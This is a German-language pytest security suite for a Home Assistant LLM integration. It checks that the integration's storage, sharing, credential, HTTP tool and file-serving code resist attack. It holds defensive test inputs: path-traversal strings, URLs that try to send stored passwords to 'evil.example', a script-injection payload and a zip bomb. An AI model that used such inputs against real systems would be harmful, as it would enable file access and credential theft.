"""Sicherheit und Datenschutz als Tests: Pfade, Rechte, Geheimnisse, Freigaben.

Tests mit ``xfail(strict=True)`` beschreiben bekannte Befunde aus der Prüfung vor Version 1.0.0 (IDs wie S1).
Ist ein Befund behoben, meldet pytest „XPASS(strict)“ und schlägt fehl – dann den Marker entfernen, der Test
schützt ab da vor einem Rückfall.
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import types
import urllib.parse

import pytest

from _lm import load

storage = load("storage")
access = load("access")
creds = load("credentials")
ha_tool = load("tools.ha")
http_tool = load("tools.http")
http_views = load("http")
tools = load("tools")


# ------------------------------------------------------------------ Daten je Person und Dateipfade
def _store(tmp_path, uid="user1"):
    hass = types.SimpleNamespace(config=types.SimpleNamespace(path=lambda *p: os.path.join(str(tmp_path), *p)))
    return storage.UserStore(hass, uid)


@pytest.mark.parametrize("name", ["../../meta.json", "../x", "/etc/passwd", "..\\..\\meta.json", "a/../../b",
                                  "a/./../../../b", "..", ".", "", "sub/../../other/x", "x\x00y", "C:\\temp\\x"])
def test_file_path_never_leaves_the_scope(tmp_path, name):
    st = _store(tmp_path)
    root = st.file_dir("chat", "c1")
    try:
        path = st.file_path("chat", "c1", name)
    except ValueError:
        return
    assert os.path.commonpath([root, path]) == root and path != root


@pytest.mark.parametrize("value", ["../x", "a/b", "a\\b", "", "x" * 65, ".", "..", "a b", None, 5])
def test_ids_from_outside_are_validated(value):
    with pytest.raises(ValueError):
        storage._check_id(value)


def test_user_store_refuses_odd_user_ids(tmp_path):
    with pytest.raises(ValueError):
        _store(tmp_path, "../admin")


def test_only_known_file_scopes(tmp_path):
    st = _store(tmp_path)
    for scope in ("meta", "../chats", "tiles", ""):
        with pytest.raises(ValueError):
            st.file_dir(scope, "x")


def test_safe_name_strips_directories_and_control_characters():
    assert storage.safe_name("../../etc/passwd") == "passwd"
    assert storage.safe_name("a\\b\\c.txt") == "c.txt"
    assert "\n" not in storage.safe_name("x\ny.txt") and ":" not in storage.safe_name("c:x")
    assert storage.safe_name("..") == "datei" and storage.safe_name("") == "datei"
    assert len(storage.safe_name("a" * 500)) <= 180


def test_chat_ids_are_checked_before_touching_the_disk(tmp_path):
    st = _store(tmp_path)
    st.meta = {"chats": {}}
    with pytest.raises(ValueError):
        asyncio.run(st.async_get_chat("../meta"))
    with pytest.raises(ValueError):
        asyncio.run(st.async_delete_chat("../meta"))


def test_masked_credentials_never_contain_secrets():
    c = {"id": "k1", "name": "Cloud", "type": "webdav",
         "fields": {"url": "https://cloud.example.org", "username": "anna", "password": "Geheim-123"}}
    out = storage.mask_credential(c, creds.secret_fields(c))
    assert "Geheim-123" not in json.dumps(out)
    assert out["fields"]["url"] == "https://cloud.example.org"


# ------------------------------------------------------------------ Teilen von Dashboards und Kacheln
OWNER, ANNA, BEN, CARL = "owner", "anna", "ben", "carl"


def test_resharing_never_grants_more_than_one_has():
    share = access.update(OWNER, None, OWNER, [{"user_id": ANNA, "edit": False, "reshare": True}])
    share = access.update(OWNER, share, ANNA, [{"user_id": BEN, "edit": True, "reshare": True}])
    assert access.rights(OWNER, share, BEN) == {"owner": False, "view": True, "edit": False, "reshare": True}


def test_only_the_owner_decides_about_everybody():
    share = access.update(OWNER, None, OWNER, [{"user_id": ANNA, "edit": True, "reshare": True}])
    with pytest.raises(PermissionError):
        access.update(OWNER, share, ANNA, [], all_in={"edit": False, "reshare": False})


def test_viewers_cannot_share_and_strangers_see_nothing():
    share = access.update(OWNER, None, OWNER, [{"user_id": ANNA}])
    with pytest.raises(PermissionError):
        access.update(OWNER, share, ANNA, [{"user_id": BEN}])
    assert access.rights(OWNER, share, CARL)["view"] is False
    with pytest.raises(PermissionError):
        access.set_notify(OWNER, share, CARL, True)


def test_taking_back_the_right_to_reshare_removes_the_whole_chain():
    share = access.update(OWNER, None, OWNER, [{"user_id": ANNA, "edit": True, "reshare": True}])
    share = access.update(OWNER, share, ANNA, [{"user_id": BEN, "edit": True, "reshare": True}])
    share = access.update(OWNER, share, BEN, [{"user_id": CARL, "edit": False, "reshare": False}])
    assert access.rights(OWNER, share, CARL)["view"]
    share = access.update(OWNER, share, OWNER, [{"user_id": ANNA, "edit": True, "reshare": False}])
    assert not access.rights(OWNER, share, BEN)["view"] and not access.rights(OWNER, share, CARL)["view"]


def test_sharing_only_with_people_who_may_use_llmitmir():
    with pytest.raises(ValueError):
        access.update(OWNER, None, OWNER, [{"user_id": "stranger"}], allowed={OWNER, ANNA})


def test_notifications_only_for_people_who_can_still_see():
    share = access.update(OWNER, None, OWNER, [{"user_id": ANNA}])
    share = access.set_notify(OWNER, share, ANNA, True)
    share = access.update(OWNER, share, OWNER, [])
    assert access.notify_users(OWNER, share) == []


# ------------------------------------------------------------------ Geheimnisse
SECRET = "S3cr3t+/Pass=wort"


def _cred(**fields):
    return {"id": "k1", "name": "Cloud", "type": "basic",
            "fields": {"url": "https://cloud.example.org", "username": "anna", "password": SECRET, **fields}}


def test_every_form_of_a_secret_is_blacked_out():
    secrets_ = creds.secret_values({"k1": _cred()})
    forms = [SECRET, urllib.parse.quote(SECRET, safe=""), urllib.parse.quote_plus(SECRET), json.dumps(SECRET)[1:-1],
             base64.b64encode(SECRET.encode()).decode(), base64.b64encode(f"anna:{SECRET}".encode()).decode()]
    for f in forms:
        assert f not in creds.scrub(f"vorher {f} nachher", secrets_), f
    nested = creds.scrub_obj({"a": [f"x{SECRET}x", {"b": SECRET}]}, secrets_)
    assert SECRET not in json.dumps(nested)


def test_the_model_never_sees_secret_values():
    out = creds.describe_for_model({"k1": _cred()})
    assert SECRET not in json.dumps(out) and out[0]["felder"]["password"] == "(geheim)"


def test_placeholders_respect_the_project_selection_and_gwdg():
    c = {"k1": _cred()}
    assert creds.resolve_placeholders("{{cred:Cloud:username}}", c) == "anna"
    with pytest.raises(PermissionError):
        creds.resolve_placeholders("{{cred:Cloud:password}}", c, allowed={"other"})
    with pytest.raises(PermissionError):
        creds.resolve_placeholders("{{cred:Nope:password}}", c)
    gwdg = {"g": {"id": "g", "name": "Uni", "type": "gwdg", "fields": {"username": "a@gwdg.de", "password": SECRET}}}
    with pytest.raises(PermissionError):
        creds.resolve_placeholders("{{cred:Uni:password}}", gwdg)


# ------------------------------------------------------------------ HTTP-Werkzeug: Zugänge nur für ihren Server
class _Resp:
    def __init__(self, body=b"{}", ctype="application/json", status=200, location=None):
        self.status, self.headers = status, {"content-type": ctype}
        if location:
            self.headers["Location"] = location
        self.content = types.SimpleNamespace(iter_chunked=self._chunks)
        self._body = body

    async def _chunks(self, _n):
        yield self._body

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False


class _Session:
    """Nimmt Anfragen auf; ``redirects`` = {url: ziel} antwortet dort mit einer Weiterleitung."""

    def __init__(self, redirects=None):
        self.calls, self.redirects = [], dict(redirects or {})

    def request(self, method, url, **kw):
        self.calls.append({"method": method, "url": url, **kw})
        if url in self.redirects:
            return _Resp(b"", "text/html", 302, self.redirects[url])
        return _Resp()

    get = lambda self, url, **kw: self.request("GET", url, **kw)  # noqa: E731


def _http_ctx(cred=None, redirects=None, internal_url=None):
    hass = types.SimpleNamespace(config=types.SimpleNamespace(internal_url=internal_url, external_url=None))
    return types.SimpleNamespace(creds={"k1": cred or _cred()}, allowed_creds=None, session=_Session(redirects),
                                 hass=hass, approved_hosts=set())


def _leaked(ctx) -> bool:
    for call in ctx.session.calls:
        auth = call.get("auth")
        blob = json.dumps({k: v for k, v in call.items() if k != "auth"}, default=str)
        if SECRET in blob or urllib.parse.quote(SECRET, safe="") in blob or (auth and getattr(auth, "password", "") == SECRET):
            return True
    return False


def test_http_request_with_a_credential_on_its_own_server_works():
    ctx = _http_ctx()
    asyncio.run(http_tool.http_request(ctx, {"url": "https://cloud.example.org/api", "zugang": "Cloud"}))
    assert ctx.session.calls and ctx.session.calls[0]["auth"].password == SECRET


def test_http_request_refuses_the_gwdg_password():
    gwdg = {"id": "g", "name": "Uni", "type": "gwdg", "fields": {"username": "a@gwdg.de", "password": SECRET}}
    ctx = _http_ctx(gwdg)
    res = asyncio.run(http_tool.http_request(ctx, {"url": "https://email.gwdg.de/x", "zugang": "Uni"}))
    assert str(res).startswith("Fehler") and not ctx.session.calls


@pytest.mark.parametrize("args", [
    {"url": "https://evil.example/collect", "zugang": "Cloud"},
    {"url": "https://evil.example/c?p={{cred:Cloud:password}}"},
    {"url": "https://evil.example/c", "header": {"X-Leak": "{{cred:Cloud:password}}"}},
])
def test_http_request_never_sends_a_credential_to_a_foreign_server(args):
    ctx = _http_ctx()
    try:
        asyncio.run(http_tool.http_request(ctx, args))
    except (PermissionError, ValueError):
        pass
    assert not _leaked(ctx)


def test_http_get_with_a_credential_for_a_foreign_server_needs_approval():
    tool = tools.REGISTRY["http_request"]
    ctx = _http_ctx()
    need = tool.gate(ctx, {"methode": "GET", "url": "https://evil.example/?p={{cred:Cloud:password}}"})
    assert need["host"] == "evil.example" and [c["name"] for c in need["creds"]] == ["Cloud"]
    assert tool.gate(ctx, {"url": "https://cloud.example.org/x", "zugang": "Cloud"}) is None
    assert tool.gate(ctx, {"url": "https://evil.example/ohne-zugang"}) is None


def test_a_host_approved_in_this_run_may_receive_the_credential():
    ctx = _http_ctx()
    ctx.approved_hosts.add(("k1", "api.example.net"))
    asyncio.run(http_tool.http_request(ctx, {"url": "https://api.example.net/x", "zugang": "Cloud"}))
    assert ctx.session.calls and ctx.session.calls[0]["auth"].password == SECRET
    assert tools.REGISTRY["http_request"].gate(ctx, {"url": "https://api.example.net/y", "zugang": "Cloud"}) is None


def test_allowed_hosts_list_and_wildcards():
    c = _cred()
    c["hosts"] = creds.clean_hosts("*.example.net, api.other.org")
    for url, ok in (("https://cloud.example.org/x", True), ("https://a.example.net/x", True), ("https://example.net", True),
                    ("https://api.other.org:8443/x", True), ("https://evilexample.net", False),
                    ("https://cloud.example.org.evil.io", False), ("https://other.org", False)):
        assert creds.host_allowed(c, url) is ok, url
    assert creds.allow_host(c, "https://new.example.io/a") and "new.example.io" in c["hosts"]
    assert not creds.allow_host(c, "https://new.example.io/b")
    for bad in ("http://", "a b", "*.", "ex ample.org", "*"):
        with pytest.raises(ValueError):
            creds.clean_hosts([bad])


def test_type_defaults_and_address_fields_count_as_allowed():
    tg = {"id": "t", "name": "Bot", "type": "telegram", "fields": {"token": SECRET}}
    assert creds.host_allowed(tg, "https://api.telegram.org/bot/x")
    imap = {"id": "i", "name": "Mail", "type": "imap", "fields": {"imap_host": "imap.example.org:993", "password": SECRET}}
    assert creds.auto_hosts(imap) == ["imap.example.org"]
    other = {"id": "o", "name": "Key", "type": "other", "fields": {"key": SECRET}, "secret_fields": ["key"]}
    assert creds.hosts(other) == [] and not creds.host_allowed(other, "https://api.example.org")


def test_no_redirect_to_another_server_with_credentials():
    ctx = _http_ctx(redirects={"https://cloud.example.org/a": "https://evil.example/steal"})
    res = asyncio.run(http_tool.http_request(ctx, {"url": "https://cloud.example.org/a",
                                                   "header": {"X-Key": "{{cred:Cloud:password}}"}}))
    assert [c["url"] for c in ctx.session.calls] == ["https://cloud.example.org/a"]
    assert res["weiterleitung"] == "https://evil.example/steal"


def test_redirects_on_the_same_server_and_without_credentials_are_followed():
    ctx = _http_ctx(redirects={"https://cloud.example.org/a": "/b", "https://open.example/x": "https://open2.example/y"})
    asyncio.run(http_tool.http_request(ctx, {"url": "https://cloud.example.org/a", "zugang": "Cloud"}))
    asyncio.run(http_tool.http_request(ctx, {"url": "https://open.example/x"}))
    assert [c["url"] for c in ctx.session.calls] == ["https://cloud.example.org/a", "https://cloud.example.org/b",
                                                     "https://open.example/x", "https://open2.example/y"]


@pytest.mark.parametrize("url", ["http://127.0.0.1:8123/api/states", "http://[::1]:8123/", "http://0.0.0.0:8123/",
                                 "http://localhost:8123/", "http://192.168.1.10:8123/"])
def test_own_home_assistant_stays_blocked_also_by_ip(url):
    ctx = _http_ctx(internal_url="http://192.168.1.10:8123")
    res = asyncio.run(http_tool.http_request(ctx, {"url": url}))
    assert str(res).startswith("Fehler: Diese Home-Assistant-Instanz") and not ctx.session.calls


def test_redirect_to_own_home_assistant_is_blocked():
    ctx = _http_ctx(redirects={"https://open.example/x": "http://127.0.0.1:8123/auth"})
    res = asyncio.run(http_tool.http_request(ctx, {"url": "https://open.example/x"}))
    assert str(res).startswith("Fehler: Diese Home-Assistant-Instanz")
    assert [c["url"] for c in ctx.session.calls] == ["https://open.example/x"]


def test_dav_request_does_not_carry_other_credentials_to_its_server():
    dav = load("tools.dav")
    nc = {"id": "n", "name": "NC", "type": "webdav", "fields": {"url": "https://nc.example.org", "username": "u", "password": "pw12345"}}
    ctx = _http_ctx()
    ctx.creds["n"] = nc
    args = {"zugang": "NC", "methode": "PROPFIND", "pfad": "x", "inhalt": "<a>{{cred:Cloud:password}}</a>"}
    with pytest.raises(PermissionError):
        asyncio.run(dav.dav_request(ctx, args))
    assert not ctx.session.calls
    assert tools.REGISTRY["dav_request"].gate(ctx, args)["creds"][0]["name"] == "Cloud"


# ------------------------------------------------------------------ Home-Assistant-Werkzeuge
WS_DESTRUCTIVE = ["config/auth/delete", "config/entity_registry/remove", "config_entries/delete",
                  "config/area_registry/delete", "config/device_registry/update", "lovelace/config/save",
                  "lovelace/config/delete", "backup/config/update", "config/auth/update", "list_delete",
                  "zha/devices/permit", "auth/current_user", "", "config_entries/flow"]
WS_READ = ["get_states", "config/entity_registry/list", "person/list", "history/history_during_period",
           "recorder/info", "imkerei/liste", "search/related", "config/area_registry/list", "lovelace/config",
           "recorder/statistics_during_period", "config_entries/get"]


@pytest.mark.parametrize("typ", WS_READ)
def test_ha_ws_reading_commands_need_no_approval(typ):
    assert not tools.REGISTRY["ha_ws"].is_write({"typ": typ})


@pytest.mark.parametrize("typ", WS_DESTRUCTIVE)
def test_ha_ws_changing_commands_always_need_approval(typ):
    assert tools.REGISTRY["ha_ws"].is_write({"typ": typ})


class _Perms:
    def __init__(self, allowed):
        self.allowed = set(allowed)

    def check_entity(self, eid, _policy):
        return eid in self.allowed


def _ha_ctx(allowed=("light.flur",), admin=False):
    calls = []

    async def async_call(domain, service, data, **kw):
        calls.append((domain, service, data, kw))

    hass = types.SimpleNamespace(services=types.SimpleNamespace(async_call=async_call))
    user = types.SimpleNamespace(id="u1", is_admin=admin, permissions=_Perms(allowed))
    return types.SimpleNamespace(hass=hass, user=user), calls


def test_ha_service_checks_the_entities_of_non_admins():
    ctx, calls = _ha_ctx()
    res = asyncio.run(ha_tool.ha_service(ctx, {"domain": "lock", "service": "unlock", "daten": {"entity_id": "lock.tuer"}}))
    assert str(res).startswith("Fehler") and not calls
    res = asyncio.run(ha_tool.ha_service(ctx, {"domain": "homeassistant", "service": "restart"}))
    assert str(res).startswith("Fehler") and not calls
    asyncio.run(ha_tool.ha_service(ctx, {"domain": "light", "service": "turn_on", "daten": {"entity_id": "light.flur"}}))
    assert len(calls) == 1 and calls[0][3]["context"].user_id == "u1"


@pytest.mark.parametrize("args", [
    {"daten": {"entity_id": "light.flur"}, "ziel": {"entity_id": "lock.tuer"}},
    {"daten": {"entity_id": "light.flur"}, "ziel": {"area_id": "flur"}},
    {"daten": {"entity_id": "light.flur, lock.tuer"}},
    {"daten": {"entity_id": "all"}},
    {"ziel": {"device_id": "abc"}},
])
def test_ha_service_checks_every_target_of_non_admins(args):
    ctx, calls = _ha_ctx()
    res = asyncio.run(ha_tool.ha_service(ctx, {"domain": "lock", "service": "unlock", **args}))
    assert str(res).startswith("Fehler") and not calls


def test_reading_services_need_read_permission_for_non_admins():
    ctx, calls = _ha_ctx()
    res = asyncio.run(ha_tool.ha_service(ctx, {"domain": "calendar", "service": "get_events",
                                               "daten": {"entity_id": "calendar.privat"}}))
    assert str(res).startswith("Fehler") and not calls


def test_admins_may_target_areas():
    ctx, calls = _ha_ctx(admin=True)
    asyncio.run(ha_tool.ha_service(ctx, {"domain": "light", "service": "turn_off", "ziel": {"area_id": "flur"}}))
    assert len(calls) == 1


def test_ha_states_shows_non_admins_only_what_they_may_read():
    s = [types.SimpleNamespace(entity_id=e, state="on", attributes={}) for e in ("light.flur", "lock.tuer")]
    ctx, _ = _ha_ctx()
    ctx.hass.states = types.SimpleNamespace(async_all=lambda: s)
    res = asyncio.run(ha_tool.ha_states(ctx, {}))
    assert [x["entity_id"] for x in res["entitaeten"]] == ["light.flur"]


# ------------------------------------------------------------------ Dateien ausliefern
class _Req(dict):
    def __init__(self, hass, user):
        super().__init__(hass_user=user)
        self.app = {"hass": hass}


def _file_response(name: str, data: bytes):
    async def read_file(scope, owner, n):
        return data

    async def user_store(_uid):
        return types.SimpleNamespace(async_read_file=read_file)

    manager = types.SimpleNamespace(allowed=lambda u: True, user_store=user_store)
    hass = types.SimpleNamespace(data={"llmitmir": {"manager": manager}})
    req = _Req(hass, types.SimpleNamespace(id="u1"))
    return asyncio.run(http_views.FileView().get(req, "chat", "c1", name))


def test_file_view_offers_unknown_types_as_download():
    resp = _file_response("tool.exe", b"MZ")
    assert resp.headers["Content-Disposition"].startswith("attachment")


@pytest.mark.parametrize("name", ["bericht.html", "bild.svg", "seite.htm", "x.xhtml", "daten.xml", "x.js"])
def test_file_view_never_serves_active_content_inline(name):
    resp = _file_response(name, b"<script>alert(1)</script>")
    disp = resp.headers.get("Content-Disposition", "")
    csp = resp.headers.get("Content-Security-Policy", "")
    assert resp.headers.get("X-Content-Type-Options") == "nosniff"
    assert disp.startswith("attachment") or "sandbox" in csp


# ------------------------------------------------------------------ Import
class _ImportStore:
    def __init__(self):
        self.meta = {k: {} for k in ("credentials", "skills", "projects", "tasks", "chats")}
        self.meta.update(memory="", settings={})
        self.files = {}

    async def async_write_file(self, scope, owner, name, data):
        self.files[(scope, owner, name)] = data

    async def async_save_meta(self):
        pass


def _import(bundle):
    st = _ImportStore()
    planned = []
    m = types.SimpleNamespace(scheduler=types.SimpleNamespace(plan=lambda uid, t: planned.append(t)))
    res = asyncio.run(http_views.import_bundle(None, m, types.SimpleNamespace(id="u1"), st, bundle))
    return st, res, planned


def test_imported_tasks_start_disabled():
    st, res, planned = _import({"tasks": [{"name": "T", "prompt": "Mach was", "schedule": "0 7 * * *"}]})
    task = next(iter(st.meta["tasks"].values()))
    assert res["tasks"] == 1 and task["enabled"] is False and planned == [task]


def test_imported_tasks_bring_no_approved_write_tools():
    st, res, _ = _import({"tasks": [{"name": "T", "prompt": "x", "allow_write": ["mail_send", "shell"], "requires": ["werkbank"]}]})
    task = next(iter(st.meta["tasks"].values()))
    assert task["allow_write"] == [] and task["requires"] == []
    assert any("mail_send" in w and "Werkbank" in w for w in res["warnings"])


@pytest.mark.parametrize("bundle", [[], "text", 5, {"skills": ["kein Objekt"]}, {"tasks": [None]}, {"chats": "x"}])
def test_import_rejects_malformed_bundles_cleanly(bundle):
    try:
        _st, res, _ = _import(bundle)
    except ValueError:
        return
    assert res["warnings"]


def test_file_view_keeps_images_and_text_inline_but_never_sniffs():
    for name in ("foto.jpg", "notiz.txt", "brief.pdf"):
        resp = _file_response(name, b"x")
        assert resp.headers["Content-Disposition"].startswith("inline")
        assert resp.headers["X-Content-Type-Options"] == "nosniff" and "sandbox" in resp.headers["Content-Security-Policy"]


def test_zip_bombs_are_refused_before_unpacking():
    import io
    import zipfile

    docpreview = load("docpreview")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("word/document.xml", b"0" * (docpreview.MAX_MEMBER + 1))
    with zipfile.ZipFile(io.BytesIO(buf.getvalue())) as z:
        with pytest.raises(ValueError):
            docpreview.zread(z, "word/document.xml")
        assert len(docpreview.zread(z, "word/document.xml", limit=docpreview.MAX_MEMBER + 1)) == docpreview.MAX_MEMBER + 1
    assert len(buf.getvalue()) < 200_000  # klein gepackt, riesig entpackt


# ------------------------------------------------------------------ fremde Aufgaben bearbeiten (S4)
taskedit = load("taskedit")


def test_owner_only_fields_are_detected_and_omitted_fields_change_nothing():
    old = {"allow_write": ["notify"], "tool_groups": None, "requires": [], "model": None, "heavy": False,
           "external_fallback": False, "project_id": "p1"}
    assert taskedit.owner_only_changes(old, {"name": "x", "prompt": "y"}) == []
    assert taskedit.owner_only_changes(old, {"allow_write": ["notify"], "requires": None, "model": "", "heavy": 0}) == []
    assert taskedit.owner_only_changes(old, {"allow_write": ["notify", "mail_send"], "requires": ["werkbank"],
                                             "project_id": "p2", "external_fallback": True}) == \
        ["allow_write", "requires", "external_fallback", "project_id"]


def test_pending_remembers_the_prompt_before_the_first_unconfirmed_change():
    old = {"prompt": "A"}
    p1 = taskedit.pending(old, "anna", 1.0)
    assert p1["prompt_before"] == "A" and p1["by"] == "anna"
    p2 = taskedit.pending({"prompt": "B", "pending_approval": p1}, "ben", 2.0)
    assert p2["prompt_before"] == "A" and p2["by"] == "ben"
    assert taskedit.prompt_changed(old, {"prompt": " A "}) is False and taskedit.prompt_changed(old, {"prompt": "C"})


def test_speech_switch_defaults_to_on_and_can_be_turned_off():
    speech = load("speech")
    assert speech.enabled({}) and speech.enabled({"speech": {}}) and speech.enabled(None)
    assert not speech.enabled({"speech": {"enabled": False}})
